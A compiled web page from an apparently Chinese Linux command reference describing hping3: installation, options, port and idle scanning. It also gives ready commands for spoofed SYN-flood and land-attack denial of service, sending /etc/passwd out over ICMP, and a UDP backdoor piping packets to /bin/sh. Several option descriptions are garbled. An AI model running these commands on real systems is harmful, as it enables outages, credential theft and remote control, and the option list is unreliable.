import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{o as s,c as n,b as e}from"./app-D3p8wuGf.js";const p={},l=e(`<h1 id="hping3" tabindex="-1"><a class="header-anchor" href="#hping3"><span>hping3</span></a></h1><p>测试网络及主机的安全</p><h2 id="补充说明" tabindex="-1"><a class="header-anchor" href="#补充说明"><span>补充说明</span></a></h2><p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p><h3 id="安装" tabindex="-1"><a class="header-anchor" href="#安装"><span>安装</span></a></h3><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>yum <span class="token function">install</span> libpcap-devel tc-devel
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/include/pcap-bpf.h /usr/include/net/bpf.h
<span class="token function">wget</span> http://www.hping.org/hping3-20051105.tar.gz
<span class="token function">tar</span> zxvf hping3-20051105.tar.gz
<span class="token builtin class-name">cd</span> hping3-20051105
./configure
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="选项" tabindex="-1"><a class="header-anchor" href="#选项"><span>选项</span></a></h3><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token parameter variable">-H</span> <span class="token parameter variable">--help</span> 显示帮助。
<span class="token parameter variable">-v</span> <span class="token parameter variable">-VERSION</span> 版本信息。
<span class="token parameter variable">-c</span> <span class="token parameter variable">--count</span> count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
<span class="token parameter variable">-i</span> <span class="token parameter variable">--interval</span> 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
<span class="token parameter variable">-n</span> <span class="token parameter variable">-nmeric</span> 数字输出，象征性输出主机地址。
<span class="token parameter variable">-q</span> <span class="token parameter variable">-quiet</span> 退出。
<span class="token parameter variable">-I</span> <span class="token parameter variable">--interface</span> interface name 无非就是eth0之类的参数。
<span class="token parameter variable">-v</span> <span class="token parameter variable">--verbose</span> 显示很多信息，TCP回应一般如：len<span class="token operator">=</span><span class="token number">46</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">flags</span><span class="token operator">=</span>RADF <span class="token assign-left variable">seq</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">255</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">win</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">rtt</span><span class="token operator">=</span><span class="token number">0</span>.4ms <span class="token assign-left variable">tos</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">iplen</span><span class="token operator">=</span><span class="token number">40</span> <span class="token assign-left variable">seq</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">ack</span><span class="token operator">=</span><span class="token number">1380893504</span> <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token number">2010</span> <span class="token assign-left variable">urp</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token parameter variable">-D</span> <span class="token parameter variable">--debug</span> 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.）
<span class="token parameter variable">-z</span> <span class="token parameter variable">--bind</span> 快捷键的使用。
<span class="token parameter variable">-Z</span> <span class="token parameter variable">--unbind</span> 消除快捷键。
<span class="token parameter variable">-O</span> <span class="token parameter variable">--rawip</span> RAWIP模式，在此模式下HPING会发送带数据的IP头。
<span class="token parameter variable">-1</span> <span class="token parameter variable">--icmp</span> ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
<span class="token parameter variable">-2</span> <span class="token parameter variable">--udp</span> UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport <span class="token parameter variable">--destport</span> --keep选项指定其模式。
<span class="token parameter variable">-9</span> <span class="token parameter variable">--listen</span> signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
<span class="token parameter variable">-a</span> <span class="token parameter variable">--spoof</span> <span class="token function">hostname</span> 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
<span class="token parameter variable">-t</span> <span class="token parameter variable">--ttl</span> <span class="token function">time</span> to live 可以指定发出包的TTL值。
<span class="token parameter variable">-H</span> <span class="token parameter variable">--ipproto</span> 在RAW IP模式里选择IP协议。
<span class="token parameter variable">-w</span> <span class="token parameter variable">--WINID</span> UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
<span class="token parameter variable">-r</span> <span class="token parameter variable">--rel</span> 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
<span class="token parameter variable">-F</span> <span class="token parameter variable">--FRAG</span> 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
<span class="token parameter variable">-x</span> <span class="token parameter variable">--morefrag</span> 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
<span class="token parameter variable">-y</span> <span class="token parameter variable">-dontfrag</span> 发送不可恢复的IP碎片，这可以让你了解更多的MTU <span class="token environment constant">PATH</span> DISCOVERY。
<span class="token parameter variable">-G</span> <span class="token parameter variable">--fragoff</span> fragment offset value <span class="token builtin class-name">set</span> the fragment offset
<span class="token parameter variable">-m</span> <span class="token parameter variable">--mtu</span> mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
<span class="token parameter variable">-G</span> <span class="token parameter variable">--rroute</span> 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
<span class="token parameter variable">-C</span> <span class="token parameter variable">--ICMPTYPE</span> <span class="token builtin class-name">type</span> 指定ICMP类型，缺省是ICMP <span class="token builtin class-name">echo</span> REQUEST。
<span class="token parameter variable">-K</span> <span class="token parameter variable">--ICMPCODE</span> CODE 指定ICMP代号，缺省0。
--icmp-ipver 把IP版本也插入IP头。
--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
--icmp-iplen 设置IP包长度。
--icmp-ipid 设置ICMP报文IP头的ID，缺省是<span class="token environment constant">RANDOM</span>。
--icmp-ipproto 设置协议的，缺省是TCP。
-icmp-cksum 设置校验和。
-icmp-ts <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> <span class="token parameter variable">--icmptype</span> <span class="token number">13</span> <span class="token punctuation">(</span>to send ICMP timestamp requests<span class="token punctuation">)</span>
--icmp-addr Alias <span class="token keyword">for</span> <span class="token parameter variable">--icmptype</span> <span class="token number">17</span> <span class="token punctuation">(</span>to send ICMP address mask requests<span class="token punctuation">)</span>
<span class="token parameter variable">-s</span> <span class="token parameter variable">--baseport</span> <span class="token builtin class-name">source</span> port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
<span class="token parameter variable">-p</span> <span class="token parameter variable">--deskport</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
<span class="token parameter variable">--keep</span> 上面说过了。
<span class="token parameter variable">-w</span> <span class="token parameter variable">--win</span> 发的大小和windows一样大，64BYTE。
<span class="token parameter variable">-O</span> <span class="token parameter variable">--tcpoff</span> Set fake tcp data offset. Normal data offset is tcphdrlen / <span class="token number">4</span>.
<span class="token parameter variable">-m</span> <span class="token parameter variable">--tcpseq</span> 设置TCP序列数。
<span class="token parameter variable">-l</span> <span class="token parameter variable">--tcpck</span> 设置TCP ack。
<span class="token parameter variable">-Q</span> <span class="token parameter variable">--seqnum</span> 搜集序列号的，这对于你分析TCP序列号有很大作用。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="hping3功能" tabindex="-1"><a class="header-anchor" href="#hping3功能"><span>Hping3功能</span></a></h3><p>Hping3主要有以下典型功能应用：</p><h3 id="防火墙测试" tabindex="-1"><a class="header-anchor" href="#防火墙测试"><span>#  防火墙测试</span></a></h3><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html</p><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token parameter variable">-S</span>  <span class="token parameter variable">-c</span> <span class="token number">1000000</span> <span class="token parameter variable">-a</span> <span class="token number">10.10</span>.10.10 <span class="token parameter variable">-p</span> <span class="token number">21</span> <span class="token number">10.10</span>.10.10
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描"><span># 端口扫描</span></a></h3><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token parameter variable">-I</span> eth0  <span class="token parameter variable">-S</span> <span class="token number">192.168</span>.10.1 <span class="token parameter variable">-p</span> <span class="token number">80</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p><p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p><h3 id="idle扫描" tabindex="-1"><a class="header-anchor" href="#idle扫描"><span># Idle扫描</span></a></h3><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h3 id="拒绝服务攻击" tabindex="-1"><a class="header-anchor" href="#拒绝服务攻击"><span># 拒绝服务攻击</span></a></h3><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token parameter variable">-I</span> eth0 <span class="token parameter variable">-a192.168.10.99</span> <span class="token parameter variable">-S</span> <span class="token number">192.168</span>.10.33 <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">-i</span> u1000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p><h3 id="文件传输" tabindex="-1"><a class="header-anchor" href="#文件传输"><span># 文件传输</span></a></h3><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token number">192.168</span>.1.159--listen signature <span class="token parameter variable">--safe</span>  <span class="token parameter variable">--icmp</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token number">192.168</span>.1.108--icmp ?d <span class="token number">100</span> <span class="token parameter variable">--sign</span> signature <span class="token parameter variable">--file</span> /etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h3 id="木马功能" tabindex="-1"><a class="header-anchor" href="#木马功能"><span># 木马功能</span></a></h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p>在木马启动端：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>hping3 <span class="token number">192.168</span>.10.66--listen signature <span class="token parameter variable">--safe</span> <span class="token parameter variable">--udp</span> <span class="token parameter variable">-p</span> <span class="token number">53</span> <span class="token operator">|</span> /bin/sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在远程控制端：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token function">ls</span> <span class="token operator">&gt;</span>test.cmd
hping3 <span class="token number">192.168</span>.10.44 <span class="token parameter variable">-p53</span> <span class="token parameter variable">-d</span> <span class="token number">100</span> <span class="token parameter variable">--udp</span> <span class="token parameter variable">--sign</span> siganature <span class="token parameter variable">--file</span> ./test.cmd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>`,42),i=[l];function t(r,c){return s(),n("div",null,i)}const m=a(p,[["render",t],["__file","hping3.html.vue"]]),v=JSON.parse('{"path":"/command/linux/hping3.html","title":"hping3","lang":"zh-CN","frontmatter":{"description":"hping3 测试网络及主机的安全 补充说明 hping 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测...","head":[["meta",{"property":"og:url","content":"https://baymaxcoding.github.io/command/linux/hping3.html"}],["meta",{"property":"og:site_name","content":"BaymaxCoding"}],["meta",{"property":"og:title","content":"hping3"}],["meta",{"property":"og:description","content":"hping3 测试网络及主机的安全 补充说明 hping 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-04-12T04:24:50.000Z"}],["meta",{"property":"article:author","content":"BaymaxCoding"}],["meta",{"property":"article:modified_time","content":"2024-04-12T04:24:50.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"hping3\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-04-12T04:24:50.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"BaymaxCoding\\",\\"url\\":\\"https://baymaxcoding.github.io/\\"}]}"]]},"headers":[{"level":2,"title":"补充说明","slug":"补充说明","link":"#补充说明","children":[{"level":3,"title":"安装","slug":"安装","link":"#安装","children":[]},{"level":3,"title":"选项","slug":"选项","link":"#选项","children":[]},{"level":3,"title":"Hping3功能","slug":"hping3功能","link":"#hping3功能","children":[]},{"level":3,"title":"#  防火墙测试","slug":"防火墙测试","link":"#防火墙测试","children":[]},{"level":3,"title":"# 端口扫描","slug":"端口扫描","link":"#端口扫描","children":[]},{"level":3,"title":"# Idle扫描","slug":"idle扫描","link":"#idle扫描","children":[]},{"level":3,"title":"# 拒绝服务攻击","slug":"拒绝服务攻击","link":"#拒绝服务攻击","children":[]},{"level":3,"title":"# 文件传输","slug":"文件传输","link":"#文件传输","children":[]},{"level":3,"title":"# 木马功能","slug":"木马功能","link":"#木马功能","children":[]}]}],"git":{"createdTime":1712895890000,"updatedTime":1712895890000,"contributors":[{"name":"BaymaxCoding","email":"BRemail2324996822@163.com","commits":1}]},"readingTime":{"minutes":7.06,"words":2117},"filePathRelative":"command/linux/hping3.md","localizedDate":"2024年4月12日","autoDesc":true}');export{m as comp,v as data};
